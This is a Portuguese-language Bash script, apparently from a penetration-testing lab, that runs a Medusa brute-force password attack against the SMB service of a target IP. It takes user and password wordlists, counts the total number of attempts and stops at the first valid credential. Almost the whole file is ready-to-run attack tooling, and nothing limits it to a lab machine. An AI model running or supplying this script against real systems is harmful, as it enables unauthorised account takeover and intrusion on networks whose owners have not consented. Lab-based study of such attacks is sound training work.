#!/bin/bash
#
# Script: ataque_medusa.sh
# Descrição: Executa ataque de força bruta paralelo usando Medusa contra serviço SMB
# Autor: Pentesting Lab
# Uso: ./ataque_medusa.sh [IP_ALVO]
#

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configurações
WORDLIST_USUARIOS="../wordlists/usuarios.txt"
WORDLIST_SENHAS="../wordlists/senhas.txt"
PROTOCOLO="smbnt"

# Banner
echo -e "${RED}"
echo "╔═══════════════════════════════════════════════╗"
echo "║     MEDUSA SMB BRUTE FORCE ATTACK TOOL        ║"
echo "║           Ethical Hacking Lab                 ║"
echo "╚═══════════════════════════════════════════════╝"
echo -e "${NC}"

# Verificar se o IP foi fornecido
if [ -z "$1" ]; then
    echo -e "${YELLOW}[!] Uso: $0 [IP_ALVO]${NC}"
    echo -e "${YELLOW}[!] Exemplo: $0 192.168.56.101${NC}"
    exit 1
fi

TARGET_IP=$1

# Verificar se os arquivos de wordlist existem
if [ ! -f "$WORDLIST_USUARIOS" ]; then
    echo -e "${RED}[x] Erro: Arquivo $WORDLIST_USUARIOS não encontrado!${NC}"
    exit 1
fi

if [ ! -f "$WORDLIST_SENHAS" ]; then
    echo -e "${RED}[x] Erro: Arquivo $WORDLIST_SENHAS não encontrado!${NC}"
    exit 1
fi

# Verificar se o Medusa está instalado
if ! command -v medusa &> /dev/null; then
    echo -e "${RED}[x] Erro: Medusa não está instalado!${NC}"
    echo -e "${YELLOW}[!] Instale com: sudo apt install medusa${NC}"
    exit 1
fi

# Informações do ataque
echo -e "${GREEN}[*] Alvo: $TARGET_IP${NC}"
echo -e "${GREEN}[*] Protocolo: $PROTOCOLO${NC}"
echo -e "${GREEN}[*] Usuários: $(wc -l < $WORDLIST_USUARIOS) entradas${NC}"
echo -e "${GREEN}[*] Senhas: $(wc -l < $WORDLIST_SENHAS) entradas${NC}"
echo -e "${GREEN}[*] Total de tentativas: $(($(wc -l < $WORDLIST_USUARIOS) * $(wc -l < $WORDLIST_SENHAS)))${NC}"
echo ""
echo -e "${YELLOW}[!] Iniciando ataque de força bruta...${NC}"
echo ""

# Executar o ataque
medusa -h $TARGET_IP -U $WORDLIST_USUARIOS -P $WORDLIST_SENHAS -M $PROTOCOLO -f

echo ""
echo -e "${GREEN}[+] Ataque finalizado!${NC}"
